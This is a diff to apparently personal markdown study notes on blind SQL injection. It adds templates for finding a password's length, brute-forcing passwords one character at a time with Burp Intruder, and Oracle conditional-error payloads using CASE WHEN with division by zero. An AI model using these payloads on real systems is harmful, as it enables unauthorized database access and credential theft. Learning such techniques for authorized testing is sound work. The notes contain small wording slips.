@@ -134,7 +134,7 @@ use + sign to produce spaces in HTTP/HTTPS requests.
 
 ## Conditional Responses
 
-- The below techniques are based on Blind SQLi conditional responses i.e. we need to infer our SQLi payload and customize it based on what the response we get. Like creating **true** or **false** statements and then whatever response we get based on that.
+- The below techniques are based on Blind SQLi conditional responses i.e. we need to infer our SQLi payload and customize it based on what the response we get. Like creating **true** or **false** statements. **true** and **false** responses will vary. Like for example :- The server might say **welcome** if the query output is **true** and might not output anything if query output is **false**.
 
 ### 1. Checking Parameter Vulnerability
 
@@ -170,7 +170,15 @@ like check each one and if responses differ you got a SQLi vulnerability
 ' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' LIMIT 1)='a'--
 ```
 
-### 4. Bruteforcing Password
+### 4. Finding Password Length
+
+- Increment the `1` value by one each time until you hit an error. So if at `19` you get error so the password length is 19.
+
+```sql
+'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>) > 1)='a'--
+```
+
+### 5. Bruteforcing Password
 
 - This attack uses **Blind SQL Injection with BurpSuite Intruder** to extract sensitive data (e.g., password) one character at a time by checking conditions. The base payload structure is `SELECT item_name FROM Shop WHERE item_name='input'`
 - The payload is designed to extract a **single character from the password column** using the `SUBSTRING()` function. It compares that character with a guessed value provided via BurpSuite payloads.
@@ -186,6 +194,40 @@ like check each one and if responses differ you got a SQLi vulnerability
 ```sql
 ' AND (SELECT SUBSTRING(<password_column>,§POS§,1) FROM users WHERE <username_column>='<username>')='§CHAR§'--
 ```
+
+## Conditional Errors
+
+- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message 
+- We can use our custom payload to generate specific errors and use those errors to gain further info about the database and ask **true** and **false** questions instead of directly asking it.
+
+### 1. Checking Parameter Vulnerability
+
+```sql
+'
+''
+/*
+verify which one of the above payloads cause error and which payload makes it disappear. If there is error produced in one and the other produces none then we have a vulnerable parameter. Since its a conditional error based sqli so direct true false queries will not work since the wep app will not return any rows. 
+*/
+```
+
+### 2. Testing Error Entries
+
+```sql
+' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
+/*
+the above payload will always result in error cuz 1=1 and 1 divide by 0 result is undefined.
+*/
+
+' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'-- 
+/*
+the above payload will not result in error cuz 1=2 is false and else part will get executed.
+*/
+
+/*
+NOTE: this is for oracle databases so check the Cheatsheet of SQli to give database specific string concatenation and syntaxes.
+*/
+```
+
 
 ---
 ## Examining the Database
